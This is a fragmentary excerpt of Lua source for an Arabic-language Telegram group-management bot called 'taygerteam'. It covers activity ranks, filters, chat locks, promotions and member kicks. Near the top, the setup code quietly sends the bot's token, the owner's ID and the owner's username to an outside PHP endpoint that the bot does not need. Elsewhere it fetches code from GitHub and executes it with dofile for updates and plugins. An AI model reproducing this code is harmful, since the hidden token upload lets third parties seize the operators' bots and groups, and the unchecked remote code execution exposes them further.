...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
res = https.request('http://Tshake.ga/taygerteam/taygerteam.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("taygerteam", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/taygerteam
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./taygerteam.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("SR", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S taygerteam -X kill
screen -S taygerteam ./taygerteam
done
]])  
file:close() 
...
local taygerteam_Msg = ''  
if msgs < 100 then 
taygerteam_Msg = 'غير متفاعل😔💔' 
elseif msgs < 200 then 
taygerteam_Msg = 'بده يتحسن😕💔' 
elseif msgs < 400 then 
taygerteam_Msg = 'شبه متفاعل😗👻' 
elseif msgs < 700 then 
taygerteam_Msg = 'متفاعل😍🙊' 
elseif msgs < 1200 then 
taygerteam_Msg = 'متفاعل قوي😍✔️' 
elseif msgs < 2000 then 
taygerteam_Msg = 'متفاعل جدا😍💘' 
elseif msgs < 3500 then 
taygerteam_Msg = 'اقوى تفاعل🙊👻'  
elseif msgs < 4000 then 
taygerteam_Msg = 'متفاعل نار😍🔥' 
elseif msgs < 4500 then 
taygerteam_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
taygerteam_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
taygerteam_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
taygerteam_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
taygerteam_Msg = 'رب التفاعل✔️😍'  
end 
return taygerteam_Msg 
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'taygerteam Chat'
...
function plugin_taygerteam(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.taygerteam and msg then
pre_msg = plugin.taygerteam(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcetaygerteam(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,taygerteam_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf taygerteam.lua')
os.execute('wget https://raw.githubusercontent.com/taygerteamSR/taygerteam/master/taygerteam.lua')
send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس تايكر\n📡| الاصدار ← { 1.2v}')
dofile('taygerteam.lua')  
end
...
local taygerteam = (w + q)
local sendok = #group - taygerteam
if q == 0 then
taygerteam = ''
else
...
send(msg.chat_id_, msg.id_,'📌¦ عدد المجموعات الان » { '..#group..' }'..taygerteamk..''..taygerteam..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤| العضو » ['..result.title_..'](t.me/'..(username or 'taygerteam')..')'
...
usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'taygerteam')..')'
status  = '\n🔘| تم ترقيته مطور في البوت'
...
--------------------------------------------------------------------------------------------------------------
if taygerteam_Msg and not Special(msg) then  
local taygerteam_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if taygerteam_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..taygerteam_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/taygerteam)}\n📛¦["..taygerteam_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/taygerteam)}\n📮| الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'taygerteam')..') \n🔘| تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'taygerteam')..') \n🔘| تـم قفـل التاك بالكتم ')  
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/taygerteamSR/Files_taygerteam/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n📁| اهلا بك في متجر ملفات تايكر\n🔰| ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n"
local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n🔘|  علامة تعني { ✓ } ملف مفعل\n🔘| علامة تعني { ✘ } ملف معطل\n🔖| قناة سورس تايكر ↓\n".."📮| [اضغط هنا لدخول](t.me/taygerteam) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/taygerteamSR/Files_taygerteam/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('taygerteam.lua')  
else
send(msg.chat_id_, msg.id_,"⚠️| عذرا هاذا ملف ليس من ملفات سورس تايكر\n") 
end
return false
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..result.title_..'](t.me/'..(text1[3] or 'taygerteam')..')'..'\n🔘| تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'تايكر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'تايكر')
local taygerteam_Msg = {
'اسمي مينو كول💘؟',
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
...
send(msg.chat_id_, msg.id_,'['..taygerteam_Msg[math.random(#taygerteam_Msg)]..']') 
return false
end
--------------------------------------------------------------------------------------------------------------
...
},function(ta,taygerteam)
local t = "\n🔘| قائمة الاعضاء \n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉\n"
x = 0
local list = taygerteam.members_
for k, v in pairs(list) do
x = x + 1
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'تايكر').." غادر" or text == 'غادر' then  
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'تايكر')
...
taygerteam = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(taygerteam)
...
--------------------------------------------------------------------------------------------------------------
Sourcetaygerteam(data.message_,data)
plugin_taygerteam(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local taygerteambot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if taygerteambot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..taygerteambot.."] \n") 
else
